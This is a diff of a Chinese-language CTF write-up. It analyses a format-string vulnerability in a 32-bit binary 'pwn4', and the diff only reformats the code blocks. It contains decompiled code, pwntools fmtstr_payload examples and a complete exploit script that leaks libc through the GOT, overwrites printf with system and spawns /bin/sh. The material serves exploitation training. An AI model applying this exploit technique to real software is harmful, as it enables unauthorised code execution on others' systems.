@@ -16,62 +16,65 @@ tags:
 
 1，检查保护
 
-	[*] '/home/chris/Pwn/pwn4'
-	    Arch:     i386-32-little
-	    RELRO:    Partial RELRO
-	    Stack:    No canary found
-	    NX:       NX enabled
-	    PIE:      No PIE (0x8048000)
-
+```python
+[*] '/home/chris/Pwn/pwn4'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+```
  只开了NX
 
 2，使用IDA分析程序流程
 
 main 函数分析
 
-	int __cdecl main(int argc, const char **argv, const char **envp)
-	{
-	  char buf; // [esp+0h] [ebp-88h]
-	
-	  puts("please login first");
-	  fflush(stdout);
-	  login();
-	  if ( login_flag )
-	  {
-	    printf("welcome~%s,the present for first meet~%p\n", &name, &buf);
-	    puts("do you have something say to me~");
-	    fflush(stdout);
-	    if ( read(0, &buf, 0x80u) < 0 )
-	    {
-	      puts("read error");
-	      exit(0);
-	    }
-	    printf(&buf);
-	  }
-	  else
-	  {
-	    puts("please login first!");
-	    login();
-	  }
-	  return 0;
-	}
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char buf; // [esp+0h] [ebp-88h]
 
+  puts("please login first");
+  fflush(stdout);
+  login();
+  if ( login_flag )
+  {
+    printf("welcome~%s,the present for first meet~%p\n", &name, &buf);
+    puts("do you have something say to me~");
+    fflush(stdout);
+    if ( read(0, &buf, 0x80u) < 0 )
+    {
+      puts("read error");
+      exit(0);
+    }
+    printf(&buf);
+  }
+  else
+  {
+    puts("please login first!");
+    login();
+  }
+  return 0;
+}
+```
 
 login 函数分析
 
-	int login()
-	{
-	  puts("your name:");
-	  fflush(stdout);
-	  if ( read(0, &name, 0x20u) < 0 )
-	  {
-	    puts("read error");
-	    exit(0);
-	  }
-	  login_flag = 1;
-	  return puts("logined!");
-	}
-
+```c
+int login()
+{
+  puts("your name:");
+  fflush(stdout);
+  if ( read(0, &name, 0x20u) < 0 )
+  {
+    puts("read error");
+    exit(0);
+  }
+  login_flag = 1;
+  return puts("logined!");
+}
+```
 程序定义了一个buf[88]的数组，首先让输入你的名字，然后再打印出刚才输入的名字和buf的栈地址，然后再让你输入一个字符串，打印出这个字符串。
 
 
@@ -99,21 +102,22 @@ login 函数分析
 
 例子：
 
-	>>> context.clear(arch = 'amd64')
-	>>> print repr(fmtstr_payload(1, {0x0: 0x1337babe}, write_size='int'))
-	'\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00%322419374c%1$n%3972547906c%2$n'
-	>>> print repr(fmtstr_payload(1, {0x0: 0x1337babe}, write_size='short'))
-	'\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00%47774c%1$hn%22649c%2$hn%60617c%3$hn%4$hn'
-	>>> print repr(fmtstr_payload(1, {0x0: 0x1337babe}, write_size='byte'))
-	'\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00%126c%1$hhn%252c%2$hhn%125c%3$hhn%220c%4$hhn%237c%5$hhn%6$hhn%7$hhn%8$hhn'
-	>>> context.clear(arch = 'i386')
-	>>> print repr(fmtstr_payload(1, {0x0: 0x1337babe}, write_size='int'))
-	'\x00\x00\x00\x00%322419386c%1$n'
-	>>> print repr(fmtstr_payload(1, {0x0: 0x1337babe}, write_size='short'))
-	'\x00\x00\x00\x00\x02\x00\x00\x00%47798c%1$hn%22649c%2$hn'
-	>>> print repr(fmtstr_payload(1, {0x0: 0x1337babe}, write_size='byte'))
-	'\x00\x00\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00\x03\x00\x00\x00%174c%1$hhn%252c%2$hhn%125c%3$hhn%220c%4$hhn'
-
+```nasm
+>>> context.clear(arch = 'amd64')
+>>> print repr(fmtstr_payload(1, {0x0: 0x1337babe}, write_size='int'))
+'\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00%322419374c%1$n%3972547906c%2$n'
+>>> print repr(fmtstr_payload(1, {0x0: 0x1337babe}, write_size='short'))
+'\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00%47774c%1$hn%22649c%2$hn%60617c%3$hn%4$hn'
+>>> print repr(fmtstr_payload(1, {0x0: 0x1337babe}, write_size='byte'))
+'\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00%126c%1$hhn%252c%2$hhn%125c%3$hhn%220c%4$hhn%237c%5$hhn%6$hhn%7$hhn%8$hhn'
+>>> context.clear(arch = 'i386')
+>>> print repr(fmtstr_payload(1, {0x0: 0x1337babe}, write_size='int'))
+'\x00\x00\x00\x00%322419386c%1$n'
+>>> print repr(fmtstr_payload(1, {0x0: 0x1337babe}, write_size='short'))
+'\x00\x00\x00\x00\x02\x00\x00\x00%47798c%1$hn%22649c%2$hn'
+>>> print repr(fmtstr_payload(1, {0x0: 0x1337babe}, write_size='byte'))
+'\x00\x00\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00\x03\x00\x00\x00%174c%1$hhn%252c%2$hhn%125c%3$hhn%220c%4$hhn'
+```
 
 ## 0X03 完整利用过程
 
@@ -125,50 +129,52 @@ login 函数分析
 
 ## 0x04 脚本
 
-	from pwn import *
-	context.log_level="debug"
-	context.arch="i386"
-	p = process("./pwn4")
-	
-	p.recvuntil("name:")
-	p.sendline("A"*0x10)
-	p.recvuntil("meet~")
-	
-	stack = int(p.recvuntil("\n",drop=True),16)
-	
-	print hex(stack)
-	ret = stack + 0x9c
-	print hex(ret)
-	put_got = 0x804A018
-	pay = p32(put_got)+"%4$s"
-	
-	pay2 = fmtstr_payload(6,{ret:0x804856E},12)
-	pay = pay + pay2
-	p.recvuntil("g say to me~")
-	
-	p.sendline(pay)
-	print p.recvuntil("\x18\xa0\x04\x08")
-	puts = u32(p.recv(4))
-	
-	libc = ELF("/lib/i386-linux-gnu/libc-2.19.so")
-	
-	system = puts - libc.symbols['puts'] + libc.symbols['system']
-	
-	sleep(2)
-	p.send("A"*0x20)
-	
-	print hex(system)
-	
-	pay = fmtstr_payload(4,{0x804a010:system,ret+4:0x0804856e},0,'short')+";/bin/sh;#"
-	
-	p.send(pay)
-	
-	sleep(2)
-	p.recvuntil("#")
-	sleep(1)
-	p.sendline("BBBBBB")
-	
-	p.interactive()
+```python
+from pwn import *
+context.log_level="debug"
+context.arch="i386"
+p = process("./pwn4")
+
+p.recvuntil("name:")
+p.sendline("A"*0x10)
+p.recvuntil("meet~")
+
+stack = int(p.recvuntil("\n",drop=True),16)
+
+print hex(stack)
+ret = stack + 0x9c
+print hex(ret)
+put_got = 0x804A018
+pay = p32(put_got)+"%4$s"
+
+pay2 = fmtstr_payload(6,{ret:0x804856E},12)
+pay = pay + pay2
+p.recvuntil("g say to me~")
+
+p.sendline(pay)
+print p.recvuntil("\x18\xa0\x04\x08")
+puts = u32(p.recv(4))
+
+libc = ELF("/lib/i386-linux-gnu/libc-2.19.so")
+
+system = puts - libc.symbols['puts'] + libc.symbols['system']
+
+sleep(2)
+p.send("A"*0x20)
+
+print hex(system)
+
+pay = fmtstr_payload(4,{0x804a010:system,ret+4:0x0804856e},0,'short')+";/bin/sh;#"
+
+p.send(pay)
+
+sleep(2)
+p.recvuntil("#")
+sleep(1)
+p.sendline("BBBBBB")
+
+p.interactive()
+```
 
 ## 0x05 总结
 
